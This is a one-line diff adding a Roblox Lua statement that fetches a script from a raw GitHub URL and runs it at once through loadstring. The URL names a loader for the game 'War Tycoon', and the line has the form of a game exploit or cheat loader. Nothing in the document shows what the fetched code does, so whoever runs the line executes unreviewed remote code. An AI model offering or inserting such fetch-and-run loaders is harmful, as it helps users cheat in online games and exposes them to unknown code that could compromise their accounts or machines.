@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SmartHammerAnimate/loaders/main/loaders/kf-41-war-tycoon-spam0-2x7cce9gjq9bnu.lua"))()
